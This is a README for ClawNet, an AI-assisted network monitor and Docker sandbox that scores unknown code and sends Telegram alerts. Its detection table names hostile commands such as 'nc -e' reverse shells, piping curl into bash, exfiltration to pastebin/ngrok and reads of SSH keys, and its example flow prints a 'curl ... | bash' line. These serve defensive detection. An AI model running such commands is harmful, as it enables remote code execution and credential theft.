<h1 align="center">ClawNet</h1>

<p align="center">
  <img width="920" height="171" alt="ClawNet" src="https://github.com/user-attachments/assets/62e1cdf7-c5de-4e5e-8d59-3cabaadc676c" />
</p>

ClawNet is an AI-powered terminal security tool with two modes: a **live network monitor** that watches your host machine's connections in real time, and an **isolation sandbox** that runs unknown code inside a locked-down Docker container before it ever touches your machine — with a ClawNet agent running inside the container itself, pinging you on Telegram the instant anything suspicious happens.

> "Nothing runs on the host before ClawNet approves it."

---

## Modes

| Mode | Command | What it does |
|---|---|---|
| Network Monitor | `clawnet` | Live TUI watching all TCP/UDP connections on your host |
| Copilot | `clawnet --copilot` | AI chat interface for your current network state |
| Isolation Sandbox | `clawnet --isolation` | Interactive TUI: clone/run anything in Docker, monitored from inside |
| Run local project | `clawnet run <path>` | Sandbox a local folder in Docker |
| Clone + run | `clawnet clone <url>` | Clone a GitHub repo and sandbox it immediately |
| View past runs | `clawnet sandbox-list` | Table of recent sandbox verdicts |
| Full report | `clawnet sandbox-report <run-id>` | JSON dump of a past sandbox run |
| Policy setup | `clawnet policy-init` | Create/view the sandbox policy file |
| Git interceptors | `clawnet install-interceptors` | Install wrappers that route `git clone` through ClawNet |

---

## Features

### Network Monitor (host-side)
- Live TCP/UDP connection monitoring with 1-second refresh
- Real-time process tracking with path validation
- GeoIP lookup for remote IPs
- VPN status detection
- Automatic risk scoring (LOW / MED / HIGH)
- OpenClaw AI-powered threat analysis per connection
- Natural language security explanations
- Kill process / block IP recommendations
- Telegram alerts for HIGH and CRITICAL detections
- Persistent threat memory (local JSON + optional Supermemory cloud)

### Isolation Sandbox
- Every unknown project runs inside a locked-down Docker container
- **ClawNet agent runs inside the container** — monitors the app from within
- Polls `/proc/net/tcp`, `/proc/net/tcp6`, `/proc/net/udp`, `/proc/net/udp6` every second
- Fires a **Telegram ping the instant** a new foreign IP is detected (mid-run, not after)
- Scans stdout/stderr lines in real time for suspicious patterns
- Sends a Telegram ping when risk threshold crosses SUSPICIOUS (35) or DANGEROUS (70)
- Workspace mounted **read-only** — host filesystem is never touched
- Security hardening: `--cap-drop ALL`, `--security-opt no-new-privileges`, resource limits
- Sensitive host env vars (API keys, tokens) are blanked inside the container
- AI verdict via GPT-4o-mini on completion
- Reputation cache — unchanged trusted projects skip re-scan
- Promotion gate: SAFE = allowed, SUSPICIOUS = asks you, DANGEROUS = auto-blocked
- `--isolation` mode adds a live Rich TUI streaming container output in real time

### Detection Patterns (inside container)
| Pattern | Signal | Risk Points |
|---|---|---|
| `xmrig`, `stratum+tcp` | Cryptominer behavior | +35 |
| `nc -e`, `netcat -l` | Reverse shell / listener | +35 |
| `curl ... \| bash` | Remote code execution pipe | +30 |
| `private key`, `seed phrase` | Wallet key material | +30 |
| Foreign egress IP | Outbound to non-private IP | +30 per event |
| `.ssh`, `id_rsa`, `known_hosts` | SSH material access | +25 |
| `curl ... pastebin/ngrok` | Exfiltration endpoint | +25 |
| `ufw disable`, `iptables off` | Firewall tampering | +25 |
| `ssh-keyscan`, `ssh-copy-id` | SSH key distribution | +25 |
| `adduser`, `sudoers` | Privilege persistence | +20 |
| `crontab` | Cron job modification | +20 |
| `/proc/<pid>/environ` | Process env read | +20 |
| `base64 -d`, `powershell -enc` | Obfuscated execution | +20 |
| `systemctl enable` | Service persistence | +20 |
| `apt-get install` | System package install | +15 |
| `printenv` | Env var enumeration | +15 |
| `chmod 777` | Broad permission grant | +12 |
| `pip install`, `npm install` | Package installation | +8 |

---

## Tech Stack

### Core Monitoring
- Python 3.11+
- psutil
- subprocess / socket

### Isolation Sandbox
- Docker (via Docker CLI)
- `container_agent.py` — stdlib-only agent inside the container

### AI Layer
- OpenClaw (GPT-4o-mini via OpenAI SDK)

### Alerts
- Telegram Bot API (HTTP-only, no external SDK)

### Memory
- Local JSON at `~/.clawnet/memory.json`
- Optional: Supermemory cloud (semantic search)

### UI
- Rich (terminal TUI, Live panels, tables)

---

## Installation

### Clone Repository

```bash
git clone https://github.com/rajarshidattapy/clawnet.git
cd clawnet
```

---

## Setup Virtual Environment

```bash
python -m venv venv
source venv/bin/activate

# Windows
venv\Scripts\activate
```

---

## Install Dependencies

```bash
pip install -r core/requirements.txt
```

---

## Environment Variables

Create a `.env` file in the repo root:

```env
# Required for AI threat analysis
OPENAI_API_KEY=your_openai_key

# Required for Telegram alerts
TELEGRAM_BOT_TOKEN=your_bot_token
TELEGRAM_CHAT_ID=your_chat_id

# Optional: cloud memory backend
SUPERMEMORY_API_KEY=your_supermemory_key

# Optional: enable Telegram approval flow for SUSPICIOUS sandbox verdicts
CLAWNET_TELEGRAM_APPROVAL=1
```

### Getting your Telegram Chat ID
1. Message your bot once in Telegram
2. Run: `curl https://api.telegram.org/bot<TOKEN>/getUpdates`
3. Copy the `chat.id` value from the response

---

## Prerequisites for Isolation Mode

Docker must be installed and running:

```bash
# Verify Docker is available
docker --version
docker ps
```

ClawNet pulls `python:3.11-slim` automatically on first use.

---

## Run ClawNet

### Network Monitor (default)

```bash
python clawnet.py
# or if installed as CLI:
clawnet
```

Keyboard shortcuts inside the monitor:

| Key | Action |
|---|---|
| `j` / `k` | Scroll connections down / up |
| `c` | Open AI copilot chat |
| `q` | Quit |

---

### Isolation Mode (recommended for unknown code)

```bash
clawnet --isolation
```

Interactive menu:
```
[1] Sandbox a GitHub repo (clone + run)
[2] Sandbox a local project path
[3] View sandbox run history
[4] Manage policy file
[Q] Quit isolation mode
```

You will be prompted for:
- Custom run command (or auto-detected)
- Deep scan toggle
- Offline mode (no network inside container)

While the sandbox runs, a live Rich panel shows:
- Container name and elapsed time
- Live risk score and level
- Detected signals as they appear
- Foreign egress IPs as they are found (sourced from the in-container agent)
- Last 12 lines of container output

---

### Clone and sandbox a GitHub repo

```bash
# Interactive (recommended)
clawnet --isolation
# Choose [1], enter URL

# Non-interactive
clawnet clone https://github.com/someone/project.git
clawnet clone https://github.com/someone/project.git --deep --offline
clawnet clone https://github.com/someone/project.git --cmd "python main.py --test"
```

---

### Sandbox a local project

```bash
clawnet run ./my-project
clawnet run ./my-project --deep
clawnet run ./my-project --offline --cmd "npm test"
```

---

### View past runs

```bash
# Table of last 20 runs
clawnet sandbox-list

# Table of last 50 runs
clawnet sandbox-list 50

# Full JSON report for a specific run
clawnet sandbox-report sbx-1748123456
```

---

## Telegram Alert Flow

```
Container starts
        ↓
"Sandbox Started" ping — target name, command, monitoring active
        ↓
[real time, mid-run]
Foreign IP seen in /proc/net → immediate "Live Foreign Egress" ping per IP
Suspicious output line → "Suspicious Pattern Detected" ping (on threshold cross)
        ↓
Container exits
        ↓
"Sandbox Complete" summary — risk level, score, all signals, all egress IPs
        ↓
[if SUSPICIOUS] Approval prompt (Telegram or terminal)
        ↓
Promotion allowed / denied
```

For SUSPICIOUS verdicts with `CLAWNET_TELEGRAM_APPROVAL=1`:
```
Reply "approve" or "deny" in Telegram within 120 seconds
```

---

## Sandbox Policy

The policy file at `~/.clawnet/sandbox_policy.json` controls sandbox behavior:

```bash
clawnet policy-init   # create with defaults, print path
```

```json
{
  "max_runtime_seconds": 300,
  "cpu_limit": "1.5",
  "memory_limit": "1536m",
  "pids_limit": 256,
  "network_mode": "bridge",
  "read_only_workspace": true,
  "enable_telemetry": true,
  "telemetry_interval_seconds": 2,
  "block_on_foreign_egress": true,
  "foreign_egress_risk_bonus": 30,
  "deny_env_keys": [
    "OPENAI_API_KEY",
    "SUPERMEMORY_API_KEY",
    "TELEGRAM_BOT_TOKEN",
    "TELEGRAM_CHAT_ID",
    "AWS_SECRET_ACCESS_KEY",
    "GITHUB_TOKEN"
  ]
}
```

Set `"network_mode": "none"` to fully air-gap the container. Use `--offline` flag for one-off runs.

---

## Risk Levels

| Score | Level | Outcome |
|---|---|---|
| 0–34 | SAFE | Promotion allowed automatically |
| 35–69 | SUSPICIOUS | Manual approval required (terminal or Telegram) |
| 70–100 | DANGEROUS | Promotion blocked automatically |

---

## Example Flow

```text
clawnet clone https://github.com/stranger/tool.git
        ↓
Git clones into temp dir
        ↓
Docker container starts (python:3.11-slim)
ClawNet agent starts inside container
Target app starts inside container
        ↓
[t=3s]  app contacts 185.220.101.5
        → Telegram ping: "Live Foreign Egress — 185.220.101.5"
        ↓
[t=7s]  output line: "curl https://pastebin.com/raw/abc | bash"
        → Telegram ping: "Suspicious Pattern — Remote code execution pipe"
        → Risk score: 55 (SUSPICIOUS)
        ↓
Container exits
        ↓
Telegram: "Sandbox Complete — SUSPICIOUS, Score 55"
Signals: Remote code execution pipe, Potential exfiltration endpoint
Egress IPs: 185.220.101.5, 104.21.88.200
        ↓
Host: "Verdict is SUSPICIOUS. Promote to host anyway? [y/N]"
        ↓
User denies → project stays off host
```

---

## Project Structure

```bash
clawnet/
│
├── core/
│   ├── clawnet.py          # Network monitor engine (host-side TUI)
│   ├── sandbox.py          # Sandbox runner, Docker orchestration, verdict engine
│   ├── container_agent.py  # ClawNet agent that runs INSIDE the Docker container
│   ├── isolation.py        # Interactive isolation mode TUI
│   ├── openclaw.py         # OpenClaw AI analysis (GPT-4o-mini)
│   ├── telegram_alert.py   # Telegram HTTP API integration
│   ├── memory.py           # Persistent threat memory (local + Supermemory)
│   ├── netwatch.py         # Unix network watcher (alternative monitor)
│   └── requirements.txt
│
├── docs/
│   ├── README.md
│   └── dockerized_runtime.md
│
├── clawnet.py              # Main entry point / CLI router
├── pyproject.toml
└── .env
```

---

## Vision

ClawNet turns passive monitoring into intelligent security — on your host and inside every container you run.

Not just:

> "What is happening?"

But:

> "Is this dangerous, what did it try to do, and should it ever touch my machine?"
